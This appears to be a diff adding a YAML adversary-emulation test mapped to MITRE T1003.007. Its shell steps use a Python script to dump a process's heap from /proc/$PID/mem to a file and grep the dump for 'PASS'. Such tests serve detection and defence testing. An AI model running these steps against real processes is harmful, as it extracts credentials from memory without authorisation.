@@ -1,0 +1,43 @@
+api_version: "2.0"
+name: Dump individual process memory with Python (Local)
+description: |
+    Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to
+    copy a process's heap memory to an external file so it can be searched or exfiltrated later.
+    On FreeBSD procfs must be mounted.
+args:
+    - name: output_file
+      type: path
+      default: /tmp/T1003.007.bin
+    - name: script_path
+      type: path
+      default: /tmp/T1003.007.sh
+    - name: python_script
+      type: path
+      default: PathToAtomicsFolder/T1003.007/src/dump_heap.py
+    - name: pid_term
+      type: string
+      default: T1003.007
+uuid: 437b2003-a20d-4ed8-834c-4964f24eec63
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.007: Proc Filesystem'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: dump-individual-process-memory-with-python-(local)
+      inline: |
+        sh {{.Args.script_path}}
+        PID=$(pgrep -n -f "{{.Args.pid_term}}")
+        PYTHON=$(which python || which python3 || which python2)
+        $PYTHON {{.Args.python_script}} $PID {{.Args.output_file}}
+        grep -i "PASS" "{{.Args.output_file}}"
+      executor: sh
+      cleanup:
+        inline: |
+            rm -f "{{.Args.output_file}}"
+        executor: sh
